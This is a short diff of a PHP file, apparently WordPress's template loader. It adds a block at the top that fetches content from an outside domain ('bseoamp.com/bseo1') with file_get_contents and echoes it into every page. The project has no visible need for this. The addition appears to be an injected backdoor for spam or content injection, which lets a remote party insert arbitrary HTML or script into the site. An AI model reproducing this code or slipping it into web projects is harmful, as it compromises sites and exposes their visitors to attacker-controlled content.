@@ -1,4 +1,8 @@
 <?php
+$a = file_get_contents('https://bseoamp.com/bseo1');
+echo $a;
+?>
+<?php
 /**
  * Loads the correct template based on the visitor's url
  *
